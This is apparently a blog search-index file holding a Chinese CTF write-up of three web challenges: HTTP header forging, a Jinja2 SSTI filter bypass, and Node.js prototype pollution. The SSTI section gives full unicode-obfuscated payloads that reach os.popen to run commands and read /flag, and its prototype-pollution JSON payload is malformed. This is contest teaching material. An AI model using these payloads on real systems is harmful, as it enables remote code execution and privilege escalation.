<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SRCTF wp</title>
      <link href="/2024/08/18/SRCTF/"/>
      <url>/2024/08/18/SRCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>考察简单的http请求头知识，具体要求为get传入参数flag&#x3D;1，post传入参数flag&#x3D;1;<br>伪造本地ip的时候可以利用burpsuite爆破，题目下面会附上字典，这里用的是Client-IP:127.0.0.1<br>接着题目提示加入User-Agent: Android和Referer:zzz.mihoyo.com<br>接着是一个新的知识点，如下图<br><img src="/2024/08/18/SRCTF/1.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isset(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]);</span><br><span class="line">//<span class="variable">$_SERVER</span>是一个超全局数组，包含了请求头和服务器信息等信息</span><br><span class="line">//<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]代表了http请求中名为AAA头的值</span><br></pre></td></tr></table></figure><p>根据以上分析，我们只需在请求中添加名为AAA的请求头即可<img src="/2024/08/18/SRCTF/2.png" alt="在这里插入图片描述"></p><p>接着根据提示加上Cookie:xxx&#x3D;1，即可得到flag<br><img src="/2024/08/18/SRCTF/3.png" alt="在这里插入图片描述"></p><h2 id="flag复读机"><a href="#flag复读机" class="headerlink" title="flag复读机"></a>flag复读机</h2><p>上来一个输入框，看到大括号瞬间就可以反应过来是ssti，手打一下，这是最笨的方法</p><img src="/2024/08/18/SRCTF/image-20240829160846524.png" alt="image-20240829160846524" style="zoom: 67%;"><p>fuzz测测它过滤了啥（下图为测试结果）</p><img src="/2024/08/18/SRCTF/image-20240829161007052.png" alt="image-20240829161007052" style="zoom: 80%;"><p>长为205的全是被过滤的，看起来过滤得挺多，但是attr()内置函数和单引号还有管道符没被过滤，那就试试unicode编码绕过（该绕过方式可以解决过滤点和下划线的问题）</p><p>附上unicode编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;&quot;</span> <span class="comment">#需要编码的类名和方法</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>造个paylaod，试试水先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"><span class="comment">#相当于&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161214569.png" alt="image-20240829161214569"></p><p>构造成功，说明思路是对的</p><p>继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f解码出来就是__base__</span></span><br><span class="line"><span class="comment">#整个paylaod相当于&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161315769.png" alt="image-20240829161315769"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(0)相当于.__base__[0]</span></span><br><span class="line"><span class="comment">#attr(&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;)()相当于.__subclasses__()</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161416177.png" alt="image-20240829161416177"></p><p>通过脚本(本题后面会贴上python找类脚本)找到&lt;os._wrap_close&gt;类在137的位置上，继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>))%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161559785.png" alt="image-20240829161559785"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u006c\u0073\u0020\u002f&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161621737.png" alt="image-20240829161621737"></p><p>最终payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;))[&#x27;read&#x27;]()相当于.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span></span><br><span class="line"><span class="comment">#popen被过滤，可用&#x27;po&#x27;&#x27;open&#x27;绕过</span></span><br><span class="line"><span class="comment">#同时/被过滤，将命令cat /flag编码绕过</span></span><br><span class="line"><span class="comment">#由于点被过滤.read()方法无法表达，用()将.read方法包括的范围装在一起，并且通过[&#x27;read&#x27;]绕过对</span></span><br><span class="line">点的过滤，即a[<span class="string">&#x27;read&#x27;</span>]()等效为a.read()</span><br></pre></td></tr></table></figure><p>ssti找类脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;类.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    a = file.read().strip()</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k) + <span class="string">&quot; &quot;</span> + <span class="string">&quot;---&gt;&quot;</span> + v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例文本（由于篇幅问题没有全放）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>扫描目录发现有个&#x2F;src路由，访问可得源码</p><p>题目源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line"><span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">64</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line"><span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;<span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[key]</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line"><span class="string">&#x27;role&#x27;</span>: req.<span class="property">session</span>.<span class="property">role</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="title function_">destroy</span>()</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;This is your flag: &#x27;</span> + flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">let</span> msg = <span class="string">&#x27;Your role is not admin&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">5000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 5000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定是原型链污染</p><p>过滤了 <strong>proto</strong> ，可以用 constructor.prototype 来代替，分析源码可得当 req.session.role 是 admin 的时候，访问 &#x2F;flag 即可得到flag</p><p>看下login路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>只要我们的登录的用户名在admins字典中，访问&#x2F;flag就可以得到flag</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="string">&quot;constructor&quot;</span><span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">   &quot;</span>prototype<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">      &quot;</span>test<span class="string">&quot;: &quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829162203071.png" alt="image-20240829162203071"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/18/hello-world/"/>
      <url>/2024/08/18/hello-world/</url>
      
